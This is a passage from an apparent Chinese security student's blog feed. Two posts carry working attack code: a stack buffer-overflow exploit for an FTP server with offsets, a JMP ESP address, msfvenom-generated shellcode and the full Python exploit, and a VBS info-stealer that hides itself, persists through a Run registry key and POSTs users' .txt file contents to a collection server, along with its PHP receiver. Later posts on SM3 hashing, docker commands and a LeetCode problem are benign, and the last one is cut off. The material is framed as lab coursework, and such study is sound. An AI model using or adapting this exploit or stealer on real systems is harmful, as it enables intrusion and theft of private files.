class="string">'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2B'</span></span><br><span class="line">port = <span class="number">21</span></span><br><span class="line">ftp.connect(<span class="string">'192.168.247.128'</span>,port)</span><br><span class="line">ftp.login(username,<span class="string">' '</span>)</span><br><span class="line"></span><br><span class="line">ftp.quit()</span><br></pre></td></tr></table></figure>

<p>测试结果：</p>
<p><img src="https://s1.ax1x.com/2020/06/22/NJQfcn.png" alt="NJQfcn.png"></p>
<p>可以发现 EIP=32714131 [ESP]=71413471 用mona插件来计算一下偏移：</p>
<p><img src="https://s1.ax1x.com/2020/06/22/NJlaUU.png" alt="NJlaUU.png"></p>
<p>EIP的偏移是485</p>
<p><img src="https://s1.ax1x.com/2020/06/22/NJl6Dx.png" alt="NJl6Dx.png"></p>
<p>ESP的偏移是493</p>
<p>这意味着，向用户名发送485个字节可以定位到EIP，8个字节之后则是ESP，而485个字节后的EIP寄存器开始被缓冲区覆盖，那么EIP中486-489字节是我们想要的目标。</p>
<p>接下来确定JMP ESP的地址，用immunity debugger中的executable modules来找到kernel32.dll系统文件，在kernel32.dll寻找JMP ESP的地址</p>
<p><img src="https://s1.ax1x.com/2020/06/22/NJ1yWQ.png" alt="NJ1yWQ.png"></p>
<p>发现有一条JMP ESP指令的地址是0x7C86467B，那么可以给EIP赋值为0x7C86467B，则CPU运行指令就会到ESP所指向的地址，也就是输入的第493个字节之后写入shellcode</p>
<p><img src="https://s1.ax1x.com/2020/06/22/NJ1ldK.png" alt="NJ1ldK.png"></p>
<p>接下来生成shellcode，这里我用的是Metasploit直接生成的方式，在kali机中输入</p>
<p><code>msfvenom -p windows/exec CMD=calc.exe EXITFUNC=thread -a x86 --platform windows -b &#39;\x00\x0d\x0a\x40&#39; -f c</code></p>
<p>其中，“-p”是指攻击载荷（payload），在windows/exec方式下可以打开计算器程序（calc.exe）；“EXITFUNC”指定退出方式；“-a x86 –platform windows”指程序运行平台，“x86、windows”是默认选项，对于本程序来说可以忽略不填，可根据实际需要填写；“-b”是排除坏字符，因为传递的都是字符串，必须要遵守字符限制的FTP 协议。这就意味着没有空，返回，换行，或是@符号，他们用16进制的表示为\x00,\x0d,\x0a,\x40。“-f”是指以C程序的方式生成Shellcode，略作修改即可在Python中使用。</p>
<p><img src="https://s1.ax1x.com/2020/06/22/NJyA2R.png" alt="NJyA2R.png"></p>
<p>那么现在可以来写exp了，首先我们要对缓冲区写入485个’A’来定位到EIP，然后写入在kernel32.dll中指令JMP ESP的地址0x7C86467B，x86程序使用小端字节序为：\x7B\x46\x86\x7C，然后再填充4个字节以便到达shellcode入口处，为了能让shellcode顺利执行，我们需要填充多个nop指令，也就是\x90字节，让CPU滑到shellcode执行。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> ftplib <span class="keyword">import</span> FTP</span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">'\xbd\xc9\x0e\x48\x97\xda\xd1\xd9\x74\x24\xf4\x58\x2b\xc9\xb1\x31\x31\x68\x13\x03\x68\x13\x83\xe8\x35\xec\xbd\x6b\x2d\x73\x3d\x94\xad\x14\xb7\x71\x9c\x14\xa3\xf2\x8e\xa4\xa7\x57\x22\x4e\xe5\x43\xb1\x22\x22\x63\x72\x88\x14\x4a\x83\xa1\x65\xcd\x07\xb8\xb9\x2d\x36\x73\xcc\x2c\x7f\x6e\x3d\x7c\x28\xe4\x90\x91\x5d\xb0\x28\x19\x2d\x54\x29\xfe\xe5\x57\x18\x51\x7e\x0e\xba\x53\x53\x3a\xf3\x4b\xb0\x07\x4d\xe7\x02\xf3\x4c\x21\x5b\xfc\xe3\x0c\x54\x0f\xfd\x49\x52\xf0\x88\xa3\xa1\x8d\x8a\x77\xd8\x49\x1e\x6c\x7a\x19\xb8\x48\x7b\xce\x5f\x1a\x77\xbb\x14\x44\x9b\x3a\xf8\xfe\xa7\xb7\xff\xd0\x2e\x83\xdb\xf4\x6b\x57\x45\xac\xd1\x36\x7a\xae\xba\xe7\xde\xa4\x56\xf3\x52\xe7\x3c\x02\xe0\x9d\x72\x04\xfa\x9d\x22\x6d\xcb\x16\xad\xea\xd4\xfc\x8a\x15\x37\xd5\xe6\xbd\xee\xbc\x4b\xa0\x10\x6b\x8f\xdd\x92\x9e\x6f\x1a\x8a\xea\x6a\x66\x0c\x06\x06\xf7\xf9\x28\xb5\xf8\x2b\x4b\x58\x6b\xb7\xa2\xff\x0b\x52\xbb'</span></span><br><span class="line">ftp = FTP()</span><br><span class="line">port = <span class="number">21</span></span><br><span class="line">ftp.connect(<span class="string">'192.168.247.128'</span>,port)</span><br><span class="line">username = <span class="string">'A'</span>*<span class="number">485</span>+<span class="string">'\x7B\x46\x86\x7C'</span>+<span class="string">'A'</span>*<span class="number">4</span>+<span class="string">'\x90'</span>*<span class="number">10</span>+shellcode</span><br><span class="line">ftp.login(username,<span class="string">' '</span>)</span><br><span class="line"></span><br><span class="line">ftp.quit()</span><br></pre></td></tr></table></figure>

<p><img src="https://s1.ax1x.com/2020/06/22/NJRg58.png" alt="NJRg58.png"></p>
<p>可以看到原程序崩溃，计算器以线程方式弹出</p>
<p>最后，我想说的是，其实ESP之后的栈空间也是具有限制的，比如本次实验中可以发现，当以1200+个字节内容进行测试时，最终停留在了一个名为msvcrt.dll的DLL文件中，而这里的EIP与41414141完全不同。另外，当payload大小为1100字节或以下时，仍然控制着EIP。</p>
<p><img src="https://s1.ax1x.com/2020/06/22/NJfSSg.png" alt="NJfSSg.png"></p>
<p><img src="https://s1.ax1x.com/2020/06/22/NJfRXj.png" alt="NJfRXj.png"></p>
<p>可以通过16进制计算得到此时EIP指向的地址在msvcrt.dll文件中</p>
<p><img src="https://s1.ax1x.com/2020/06/22/NJhsbR.png" alt="NJhsbR.png"></p>
<p>由此可以计算出exp可利用的空间，这一点在写payload的时候非常重要。</p>
]]></content>
      <categories>
        <category>逆向</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>exp</tag>
        <tag>缓冲区溢出</tag>
      </tags>
  </entry>
  <entry>
    <title>vbs窃密脚本</title>
    <url>/2020/05/21/vbs%E7%AA%83%E5%AF%86%E8%84%9A%E6%9C%AC/</url>
    <content><![CDATA[<h1 id="VBS窃密脚本"><a href="#VBS窃密脚本" class="headerlink" title="VBS窃密脚本"></a>VBS窃密脚本</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>​        计算机病毒老师要让整一个大作业，形式不限，刚好对之前老师讲到的VBS脚本病毒感兴趣，所以自己也想整一个，设计了一个无害的窃密脚本，也算是巩固之前的学习。上个月找了家实习，所以博客最近更新比较慢，马上又要考试，估计后面更新随缘，等这段时间忙过去就好了，主要在公司实习做的主动防御，也就是流量分析和样本分析，这些内容不好写，后面碰到可以写的就发到博客上面来。</p>
<a id="more"></a>

<h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><blockquote>
<p>测试环境：虚拟机：WindowsXP SP3  ip：192.168.2.134</p>
<p>​                  物理机：Windows10 ip：192.168.2.1</p>
</blockquote>
<p>先把VBS脚本内容贴出来：</p>
<figure class="highlight vbscript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">set</span> fso=<span class="built_in">createobject</span>(<span class="string">"scripting.filesystemobject"</span>) <span class="comment">'创建文件系统对象</span></span><br><span class="line"><span class="keyword">if</span> fso.getFile(Wscript.ScriptFullName)=<span class="string">"C:\here.vbs"</span> <span class="keyword">then</span> <span class="comment">'检测是否在指定路径中</span></span><br><span class="line">    scan(<span class="string">"C:\Documents and Settings\Administrator\桌面"</span>)</span><br><span class="line">    <span class="keyword">sub</span> scan(folder_) <span class="comment">'写一个扫描过程</span></span><br><span class="line">        <span class="keyword">on</span> <span class="keyword">error</span> <span class="keyword">resume</span> <span class="keyword">next</span></span><br><span class="line">        <span class="keyword">set</span> folder_=fso.getfolder(folder_)</span><br><span class="line">	<span class="keyword">set</span> files=folder_.files</span><br><span class="line">	<span class="keyword">for</span> <span class="keyword">each</span> file <span class="keyword">in</span> files</span><br><span class="line">            ext=fso.GetExtensionName(file) <span class="comment">'获取文件后缀</span></span><br><span class="line">	    ext=<span class="built_in">lcase</span>(ext) <span class="comment">'后缀名转换成小写字母</span></span><br><span class="line">            <span class="keyword">if</span> ext=<span class="string">"txt"</span> <span class="keyword">then</span>  <span class="comment">'寻找txt文件</span></span><br><span class="line">	        <span class="keyword">set</span> self=fso.opentextfile(file,<span class="number">1</span>)</span><br><span class="line">                information=self.readall <span class="comment">'读取文件内容</span></span><br><span class="line">                <span class="keyword">Set</span> http = <span class="built_in">CreateObject</span>(<span class="string">"Msxml2.XMLHTTP"</span>) <span class="comment">'创建HTTP连接对象</span></span><br><span class="line">                http.open <span class="string">"POST"</span>, <span class="string">"http://192.168.2.1/vbstest.php"</span>, <span class="literal">False</span>  <span class="comment">'对http服务器发起post请求</span></span><br><span class="line">                http.setRequestHeader <span class="string">"CONTENT-TYPE"</span>,<span class="string">"application/x-www-form-urlencoded"</span></span><br><span class="line">                http.send <span class="string">"information="</span>&amp;file+<span class="string">" : "</span>&amp;information <span class="comment">'格式化发送内容</span></span><br><span class="line">	    <span class="keyword">end</span> <span class="keyword">if</span></span><br><span class="line">        <span class="keyword">next</span></span><br><span class="line">        <span class="keyword">set</span> subfolders=folder_.subfolders</span><br><span class="line">        <span class="keyword">for</span> <span class="keyword">each</span> subfolder <span class="keyword">in</span> subfolders <span class="comment">'搜索其他目录</span></span><br><span class="line">        scan(subfolder)  <span class="comment">'用递归的方式遍历子目录</span></span><br><span class="line">        <span class="keyword">next</span></span><br><span class="line">    <span class="keyword">end</span> <span class="keyword">sub</span></span><br><span class="line"><span class="keyword">else</span> <span class="comment">'不在时将其放到指定路经并设置注册表开机自启</span></span><br><span class="line">    <span class="keyword">set</span> self=fso.opentextfile(wscript.scriptfullname,<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">set</span> selfpath=fso.getFile(wscript.scriptfullname)</span><br><span class="line">    vbscopy=self.readall</span><br><span class="line">    self.close</span><br><span class="line">    selfpath.delete() <span class="comment">'自删除</span></span><br><span class="line">    <span class="keyword">set</span> ap =fso.opentextfile(<span class="string">"C:\here.vbs"</span>,<span class="number">2</span>,<span class="literal">true</span>)</span><br><span class="line">    ap.write vbscopy</span><br><span class="line">    ap.close</span><br><span class="line">    <span class="keyword">set</span> shell=WScript.<span class="built_in">CreateObject</span>(<span class="string">"WScript.Shell"</span>)</span><br><span class="line">    shell.regwrite <span class="string">"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\here"</span>,<span class="string">"C:\here.vbs"</span>,<span class="string">"REG_SZ"</span>  <span class="comment">'修改注册表以达到自启动</span></span><br><span class="line"><span class="keyword">end</span> <span class="keyword">if</span></span><br></pre></td></tr></table></figure>

<p>脚本语言配合注释很好理解，代码不多阐述</p>
<p><strong>代码的主要功能：</strong></p>
<p>​    脚本文件启动后会将自身复制到c盘根目录下（可以修改到任意目录和文件名称，以增强隐蔽性），同时将复制的文件通过修改注册表，加入到开机自启动项中，实现开机自启，然后自删除。</p>
<p>​    复制文件随着开机自启会扫描桌面目录及其子目录上的txt文件（可以修改代码使之扫描任何目录和其子目录），并且将文件内容发送到远程的http服务器上，达到窃密的效果。</p>
<p><strong>脚本效果展示：</strong>(图有点糊，凑合看吧)</p>
<p>将脚本放到桌面运行：</p>
<p><img src="https://s1.ax1x.com/2020/05/21/YqYb9S.png" alt="YqYb9S.png"></p>
<p>运行here.txt.vbs</p>
<p><img src="https://s1.ax1x.com/2020/05/21/YqYLcQ.png" alt="YqYLcQ.png"></p>
<p>运行后脚本消失</p>
<p><img src="https://s1.ax1x.com/2020/05/21/Yqt9hT.png" alt="Yqt9hT.png"></p>
<p>同时在c盘根目录下发现vbs脚本</p>
<p>下面在物理机中启动http服务器，服务器搭设和脚本无关，在此不描述，在网站根目录写入php文件，用来接受脚本发来的消息，并将消息追加到同目录下information.txt文件下：</p>
<p>PHP代码如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"This is an information collection site that receives private information from a post request sent by a VBS script virus"</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">"information"</span>]))&#123;</span><br><span class="line">    $myfile = fopen(<span class="string">"information.txt"</span>, <span class="string">"a"</span>); <span class="comment">//用于将接收到的消息追加到information.txt中</span></span><br><span class="line">    fwrite($myfile, date(<span class="string">"Y-m-d H:i"</span>,time()).<span class="string">"\n"</span>);</span><br><span class="line">    fwrite($myfile, $_POST[<span class="string">'information'</span>].<span class="string">"\n"</span>);</span><br><span class="line">    fclose($myfile);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>在虚拟机浏览器连接测试网络连通性：</p>
<p><img src="https://s1.ax1x.com/2020/05/21/YqtnN6.png" alt="YqtnN6.png"></p>
<p>OK 测试无误</p>
<p>重启测试脚本是否自启动，并且将桌面目录以及其子目录txt文件发送到服务器：</p>
<p>我在XP桌面目录以及其子目录下新建2个txt文件，如下：</p>
<p><img src="https://s1.ax1x.com/2020/05/21/Yqt1jH.png" alt="Yqt1jH.png"></p>
<p>txt文件内容如下：</p>
<p><img src="https://s1.ax1x.com/2020/05/21/YqttEt.png" alt="YqttEt.png"></p>
<p>重启XP：（这熟悉的画面，我的青春回来了）</p>
<p><img src="https://s1.ax1x.com/2020/05/21/YqUAT1.png" alt="YqUAT1.png"></p>
<p><img src="https://s1.ax1x.com/2020/05/21/Yqtruj.png" alt="Yqtruj.png"></p>
<p>重启后XP无任何异常</p>
<p>在物理机网站根目录下查看information.txt文件：</p>
<p><img src="https://s1.ax1x.com/2020/05/21/YqNERS.png" alt="YqNERS.png"></p>
<p>NICE！！！接受到了脚本发来的数据</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>总结：</p>
<p>在设计脚本的时候按照病毒的特性去设计的，但是考虑到脚本仅用于实验，所以设计了一个无害的窃密脚本，以下归纳一些此脚本的特性：</p>
<ol>
<li>隐蔽性：</li>
</ol>
<p>脚本在运行后我复制到一个用户未知的文件夹中，然后自删除，且可以将脚本名称改为例如：“system.ini.vbs”之类迷惑用户，达到隐蔽的目的，且脚本在执行窃密时无任何反应。</p>
<ol start="2">
<li>自启动性</li>
</ol>
<p>脚本会将复制挪移后的脚本文件加入到注册表中的自启动项中，达到每次的开机自启窃密的目的。</p>
<ol start="3">
<li>破坏性</li>
</ol>
<p>无</p>
<ol start="4">
<li>传染性</li>
</ol>
<p>无传染文件的行为</p>
<ol start="5">
<li>传播性</li>
</ol>
<p>靠黑客社工或者鱼叉攻击吧</p>
<ol start="6">
<li>可触发性：</li>
</ol>
<p>随着开机启动触发脚本</p>
<p>此脚本无自我恢复性，清除脚本只需要找到脚本文件删除并将注册表项删除即可。</p>
<p><strong>注意：这个VBS脚本目前只在XP上可以运行，在Windows10上弄不起来，应该时Windows10的一些安全策略的影响，不过这玩意也是要淘汰的，就当是复古一下吧</strong></p>
]]></content>
      <categories>
        <category>杂项</category>
      </categories>
      <tags>
        <tag>vbs</tag>
      </tags>
  </entry>
  <entry>
    <title>SM3密码杂凑算法</title>
    <url>/2020/05/07/SM3%E5%AF%86%E7%A0%81%E6%9D%82%E5%87%91%E7%AE%97%E6%B3%95/</url>
    <content><![CDATA[<h1 id="SM3密码杂凑算法"><a href="#SM3密码杂凑算法" class="headerlink" title="SM3密码杂凑算法"></a>SM3密码杂凑算法</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>国密即国家密码局认定的国产密码算法。主要有SM1，SM2，SM3，SM4。</p>
<p>SM1 为对称加密。其加密强度与AES相当。该算法不公开，调用该算法时，需要通过加密芯片的接口进行调用。密钥长度和分组长度均为128位。</p>
<p>SM2为非对称加密，基于ECC。该算法已公开。由于该算法基于ECC，故其签名速度与秘钥生成速度都快于RSA。ECC 256位（SM2采用的就是ECC 256位的一种）安全强度比RSA 2048位高，但运算速度快于RSA。</p>
<p>SM3 消息摘要。可以用MD5作为对比理解。该算法已公开。校验结果为256位。</p>
<p>SM4 无线局域网标准的分组数据算法。对称加密，密钥长度和分组长度均为128位。</p>
<p>最近学到国密算法，记录一下SM3的原理(用了一下老师课件的图，主要公式太难敲了，文中仅有的几个公式是按照LaTeX格式写的，我不会用hexo生成LaTeX公式，按照格式凑合看吧)。</p>
<a id="more"></a>

<h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><h3 id="符号和常量"><a href="#符号和常量" class="headerlink" title="符号和常量"></a>符号和常量</h3><p>ABCDEFGH 8个32位寄存器</p>
<p>B^{(i)}​  第 i 个消息分组(512位)</p>
<p>CF​  压缩函数</p>
<p>FF_j​  布尔函数，随着 j 不同取不同的表达式，输出结果为32位</p>
<p>GG_j​  布尔函数，随着 j 不同取不同的表达式，输出结果为32位</p>
<p>IV​  初始值(256位 8个字)</p>
<p>P_0​  压缩函数中的置换函数，输入输出为32位</p>
<p>P_1​  消息扩展中的置换函数，输入输出为32位</p>
<p>T_j​  算法常量，随 j 的变化取不同的值(32位)</p>
<p><img src="https://s1.ax1x.com/2020/05/07/YmJYmq.png" alt="YmJYmq.png"></p>
<p><img src="https://s1.ax1x.com/2020/05/07/YmJakT.png" alt="YmJakT.png"></p>
<h3 id="算法描述"><a href="#算法描述" class="headerlink" title="算法描述"></a>算法描述</h3><h4 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h4><p>对于长度为 l (l &lt; 2^{64}​)比特的消息，SM3杂凑算法经过填充，迭代压缩和输出选裁，生成杂凑值，为256比特</p>
<h4 id="填充"><a href="#填充" class="headerlink" title="填充"></a>填充</h4><p>假设消息 m 的长度为 l 比特，则首先将比特“1”加入末尾，后加入 k 个“0”比特，k满足 l+1+k = 448(mod 512) 的最小非负整数，后添加64位比特串，该比特串为 l 的二进制表示。填充后的消息 m’ 为512比特的倍数</p>
<h4 id="迭代压缩"><a href="#迭代压缩" class="headerlink" title="迭代压缩"></a>迭代压缩</h4><p><img src="https://s1.ax1x.com/2020/05/07/YmtFsA.png" alt="YmtFsA.png"></p>
<h4 id="消息扩展"><a href="#消息扩展" class="headerlink" title="消息扩展"></a>消息扩展</h4><p><img src="https://s1.ax1x.com/2020/05/07/YmtGd0.png" alt="YmtGd0.png"></p>
<h4 id="压缩函数"><a href="#压缩函数" class="headerlink" title="压缩函数"></a>压缩函数</h4><p><img src="https://s1.ax1x.com/2020/05/07/YmNkpF.png" alt="YmNkpF.png"></p>
<p><img src="https://s1.ax1x.com/2020/05/07/YmNzge.png" alt="YmNzge.png"></p>
<p><strong>注意：基本的压缩函数得到 ABCDEFGH 8个字寄存器的值，输出的 V^{(i+1)}​ = ABCDEFGH ⊕ ​V^{(i)}​</strong></p>
<p>基本压缩函数图示为：</p>
<p><img src="https://s1.ax1x.com/2020/05/07/YmUCDA.png" alt="YmUCDA.png"></p>
<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>最终迭代压缩生成的 V^{(n)}​ = ABCDEFGH 就是SM3算法输出的摘要值，为256位。</p>
<p>SM3工作的全过程可以图示描述：</p>
<p><img src="https://s1.ax1x.com/2020/05/07/YmdIgS.png" alt="YmdIgS.png"></p>
]]></content>
      <categories>
        <category>密码学</category>
      </categories>
      <tags>
        <tag>SM3</tag>
        <tag>hash</tag>
      </tags>
  </entry>
  <entry>
    <title>docker指令</title>
    <url>/2020/04/20/docker%E6%8C%87%E4%BB%A4/</url>
    <content><![CDATA[<h1 id="Docker"><a href="#Docker" class="headerlink" title="Docker"></a>Docker</h1><p>本文用于记录常用的docker指令，关于docker的介绍和学习可以看这篇<a href="https://www.ruanyifeng.com/blog/2018/02/docker-tutorial.html" target="_blank" rel="noopener">博客</a></p>
<a id="more"></a>

<h2 id="服务相关命令"><a href="#服务相关命令" class="headerlink" title="服务相关命令"></a>服务相关命令</h2><ul>
<li><p>启动docker服务</p>
<p><code>systemctl start docker</code></p>
</li>
<li><p>停止docker服务</p>
<p><code>systemctl stop docker</code></p>
</li>
<li><p>重启docker服务</p>
<p><code>systemctl restart docker</code></p>
</li>
<li><p>查看docker服务状态</p>
<p><code>systemctl status docker</code></p>
</li>
<li><p>设置开机启动docker服务</p>
<p><code>systemctl enable docker</code></p>
</li>
</ul>
<h2 id="镜像相关命令"><a href="#镜像相关命令" class="headerlink" title="镜像相关命令"></a>镜像相关命令</h2><ul>
<li><p>查看镜像：查看本地所有的镜像</p>
<p><code>docker images</code></p>
</li>
<li><p>搜索镜像：从网络中查找需要的镜像</p>
<p><code>docker search &lt;name&gt;</code></p>
</li>
<li><p>拉取镜像：从docker仓库中下载镜像(版本号可以看<a href="https://hub.docker.com/" target="_blank" rel="noopener">官网</a>)</p>
<p><code>docker pull &lt;name&gt;</code></p>
</li>
<li><p>删除镜像：删除本地镜像</p>
<p><code>docker rmi &lt;id&gt;</code></p>
<p><code>docker rmi &#39;docker images -q&#39;</code> #删除所有镜像</p>
</li>
</ul>
<h2 id="容器相关命令"><a href="#容器相关命令" class="headerlink" title="容器相关命令"></a>容器相关命令</h2><ul>
<li><p>查看容器</p>
<p><code>docker ps</code> #查看正在运行的容器</p>
<p><code>docker ps -a</code> #查看所有容器</p>
</li>
<li><p>创建并启动容器</p>
<p><code>docker run 参数</code></p>
<blockquote>
<p>参数说明</p>
<p>-i ：保持容器运行。</p>
<p>-t ：为容器重新分配一个伪输入终端</p>
<p>-d ：以后台模式运行容器。需要<code>docker exec</code>进入容器内部</p>
<p>-it创建的容器为交互式容器    -id创建的容器为守护式容器</p>
<p>–name ：为创建的容器命名</p>
</blockquote>
</li>
<li><p>进入容器</p>
<p><code>docker exec 参数</code></p>
</li>
<li><p>停止容器</p>
<p><code>docker stop 参数</code></p>
</li>
<li><p>启动容器</p>
<p><code>docker start 参数</code></p>
</li>
<li><p>删除容器（在容器停止状态下才能删除）</p>
<p><code>docker rm 参数</code></p>
</li>
<li><p>查看容器信息</p>
<p><code>docker inspect 参数</code></p>
</li>
</ul>
<h2 id="容器数据卷"><a href="#容器数据卷" class="headerlink" title="容器数据卷"></a>容器数据卷</h2><ul>
<li><p>创建启动容器时，使用<code>-v</code>参数设置数据卷</p>
<p><code>docker run ... -v 宿主机目录(文件):容器内目录(文件)</code></p>
<blockquote>
<p>目录为绝对路径</p>
<p>如果目录不存在，会自动创建</p>
<p>可以挂载多个数据卷</p>
</blockquote>
</li>
</ul>
<h2 id="镜像制作"><a href="#镜像制作" class="headerlink" title="镜像制作"></a>镜像制作</h2><ul>
<li><p>容器转为镜像</p>
<p><code>docker commit &lt;容器id&gt; &lt;镜像name:version&gt;</code></p>
</li>
<li><p>镜像转为压缩文件用于传输</p>
<p><code>docker save -o &lt;压缩文件name&gt; &lt;镜像name:version&gt;</code></p>
</li>
<li><p>压缩文件还原镜像</p>
<p><code>docker load -i &lt;压缩文件name&gt;</code></p>
</li>
</ul>
<h2 id="Dockerfile"><a href="#Dockerfile" class="headerlink" title="Dockerfile"></a>Dockerfile</h2><p><code>Dockerfile</code>的编写，可以理解为编写一堆命令，这堆命令做的事，就是基于一个基础镜像（这个镜像通常是选择官方的镜像），跑一个临时的容器，然后将代码添加到临时容器中并安装运行代码所需要的环境，最后将这个临时的容器打包成新的镜像，删除这个临时的镜像。这种效率比较慢，还不如本地跑一个容器，将所有环境配置好，然后打包成镜像使用。</p>
]]></content>
      <categories>
        <category>工具使用</category>
      </categories>
      <tags>
        <tag>docker</tag>
      </tags>
  </entry>
  <entry>
    <title>LeetCode题解289</title>
    <url>/2020/04/19/LeetCode%E9%A2%98%E8%A7%A3289/</url>
    <content><![CDATA[<h1 id="LeetCode题解"><a href="#LeetCode题解" class="headerlink" title="LeetCode题解"></a>LeetCode题解</h1><p><strong>第289题 生命游戏</strong></p>
<p>根据<a href="https://baike.baidu.com/item/%E7%94%9F%E5%91%BD%E6%B8%B8%E6%88%8F/2926434?fr=aladdin" target="_blank" rel="noopener">百度百科</a>，生命游戏，简称为生命，是英国数学家约翰·何顿·康威(老爷子前段时间因为新冠肺炎去世，唉，缅怀)在 1970 年发明的细胞自动机。</p>
<p>给定一个包含 m × n 个格子的面板，每一个格子都可以看成是一个细胞。每个细胞都具有一个初始状态：1 即为活细胞（live），或 0 即为死细胞（dead）。每个细胞与其八个相邻位置（水平，垂直，对角线）的细胞都遵循以下四条生存定律：</p>
<blockquote>
<ol>
<li>如果活细胞周围八个位置的活细胞数少于两个，则该位置活细胞死亡；</li>
<li>如果活细胞周围八个位置有两个或三个活细胞，则该位置活细胞仍然存活；</li>
<li>如果活细胞周围八个位置有超过三个活细胞，则该位置活细胞死亡；</li>
<li>如果死细胞周围正好有三个活细胞，则该位置死细胞复活；</li>
</ol>
</blockquote>
<p>根据当前状态，写一个函数来计算面板上所有细胞的下一个（一次更新后的）状态。下一个状态是通过将上述规则同时应用于当前状态下的每个细胞所形成的，其中细胞的出生和死亡是同时发生的。</p>
<p>示例：</p>
<blockquote>
<p>输入：<br>[<br>  [0,1,0],<br>  [0,0,1],<br>  [1,1,1],<br>  [0,0,0]<br>]<br>输出：<br>[<br>  [0,0,0],<br>  [1,0,1],<br>  [0,1,1],<br>  [0,1,0]<br>]</p>
</blockquote>
<a id="more"></a>

<p>原题如上，代码如下：</p>
<p><strong>python版本</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">check</span><span class="params">(self,i,j,board)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> i == len(board) <span class="keyword">or</span> i == <span class="number">-1</span> <span class="keyword">or</span> j == len(board[<span class="number">0</span>]) <span class="keyword">or</span> j == <span class="number">-1</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">        <span class="keyword">return</span> board[i][j]</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">environment</span><span class="params">(self,i,j,board)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self.check(i<span class="number">-1</span>,j<span class="number">-1</span>,board)+self.check(i<span class="number">-1</span>,j,board)+self.check(i<span class="number">-1</span>,j+<span class="number">1</span>,board)+self.check(i,j<span class="number">-1</span>,board)+self.check(i,j+<span class="number">1</span>,board)+self.check(i+<span class="number">1</span>,j<span class="number">-1</span>,board)+self.check(i+<span class="number">1</span>,j,board)+self.check(i+<span class="number">1</span>,j+<span class="number">1</span>,board)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">now</span><span class="params">(self,i,j,k,board)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> board[i][j] == <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">if</span> k == <span class="number">2</span> <span class="keyword">or</span> k== <span class="number">3</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> board[i][j] == <span class="number">0</span> <span class="keyword">and</span> k == <span class="number">3</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>       </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span 